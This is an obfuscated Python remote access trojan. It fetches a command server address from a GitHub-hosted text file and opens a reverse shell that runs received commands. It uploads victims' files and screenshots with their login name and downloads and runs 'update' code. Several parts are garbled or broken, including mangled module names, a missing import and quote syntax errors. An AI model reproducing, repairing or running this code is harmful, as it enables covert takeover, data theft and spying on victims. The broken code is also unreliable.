import sys,subeBOyddYwMpIGGCIvv as sb,socket,time,requests
from PIL import ImageGrab
jeeXrikwRCcAzcPzjuKbR = "1.29.11.24"
pGQzunfeLNWKPrngnGFgu = ""
ZaBckIOencW = ""
TCuBHVNCgML = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
UVlYmQNfzpHfOnsxlzYAF = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
JVAeWJIYYXV = "!"
def OdfaTIFSp(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.OdfaTIFSp((host, port))
	return s
def eBOyddYwMpIGGCIvv(s):
	cpOvDlJAg = s.recv(1024)
	if len(cpOvDlJAg)==0:
		return True
	else:
		ojrrOerJ(s, cpOvDlJAg.decode("utf-8"))
def ojrrOerJ(s, ORTTgfzFwxXr):
	if not ORTTgfzFwxXr.startswith(JVAeWJIYYXV):
		proc = sb.run(cpOvDlJAg.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	eDkCdjjmVNHUlmGz = ORTTgfzFwxXr.split(" ")[0][1:]
	if eDkCdjjmVNHUlmGz == "download":
		XQtnXllJjdmd(s, ORTTgfzFwxXr)
	elif eDkCdjjmVNHUlmGz == "screenshot":
		dPeQTmpPPYh(s)
def XQtnXllJjdmd(s, ORTTgfzFwxXr):
	osRuhRoFicJX = ORTTgfzFwxXr.replace(JVAeWJIYYXV+"screenshot ", "").split(",")
	results = []
	for f in osRuhRoFicJX:
		results += htxDreDhADUFetlgxEZGI(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def dPeQTmpPPYh(ORTTgfzFwxXr):
	IXJvozkVBWTJpKBmK = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	IXJvozkVBWTJpKBmK.save(fpath)
	IXJvozkVBWTJpKBmK.close()
	r = htxDreDhADUFetlgxEZGI(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def htxDreDhADUFetlgxEZGI(filePath, uploadPath, addHeaders=None):
	if not os.path.exists(filePath):
		return "FILE NOT FOUND: "+filePath
	headers = {"user":os.getlogin()}
	if addHeaders is not None:
		headers = {**headers, **addHeaders}
	requests.post(pGQzunfeLNWKPrngnGFgu+":"+ZaBckIOencW+"/"+uploadPath,
		files={open(filePath, "rb")},
		headers=headers)
	return "SUCCESS"
def uyVVulZyectb():
	if pGQzunfeLNWKPrngnGFgu == "" or ZaBckIOencW == "":
		cpOvDlJAg = requests.get(TCuBHVNCgML).text.replace("\n","").split(":")
		pGQzunfeLNWKPrngnGFgu = cpOvDlJAg[0].strip()
		ZaBckIOencW = cpOvDlJAg[1].strip()
		SxchaBRTfvviGeMWTXshWNp = cpOvDlJAg[2].strip()
	return pGQzunfeLNWKPrngnGFgu, ZaBckIOencW, SxchaBRTfvviGeMWTXshWNp
def MaPoYOWKuPkfbKVEyrL():
	currentName = os.path.basename(__file__)
	fileType = currentName.split(".")[-1]
	updateFileName = currentName.replace(fileType,"") +"."+jeeXrikwRCcAzcPzjuKbR + fileType
	fullUpdateFilePath = os.path.join(os.path.getcwd(), updateFileName)
	with open(updateFileName, "wb+") as f:
		f.write(requests.get(UVlYmQNfzpHfOnsxlzYAF+"/file"+fullUpdateFilePath.split(".")[-1]))
	if executable:
		os.system(".\"+fullUpdateFilePath)
	else:
		os.system("python "+fullUpdateFilePath")
def MLvDpVkCvjFehKVDcQ():
	pass
def MRAEJmdbOnnCcItqcafvbaD():
	h, p, v = uyVVulZyectb()
	if jeeXrikwRCcAzcPzjuKbR != v:
		MaPoYOWKuPkfbKVEyrL()
	MLvDpVkCvjFehKVDcQ()
	while True:
		try:
			while True:
				shurPugBXESJVHt=False
				try:
					s=OdfaTIFSp(h, p)
					while not shurPugBXESJVHt:
						s.send(b"\n>> ")
						shurPugBXESJVHt=eBOyddYwMpIGGCIvv(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(MRAEJmdbOnnCcItqcafvbaD())
